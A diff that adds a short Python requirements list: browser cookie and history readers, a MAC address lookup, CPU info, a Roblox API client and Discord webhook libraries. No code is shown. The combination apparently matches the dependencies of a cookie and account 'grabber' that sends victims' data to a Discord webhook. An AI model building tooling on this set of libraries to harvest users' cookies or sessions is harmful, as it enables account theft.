@@ -1,0 +1,8 @@
+browser_cookie3
+discord_Webhook
+browser_history
+getmac
+py-cpuinfo
+robloxpy
+discordwebhook
+discord
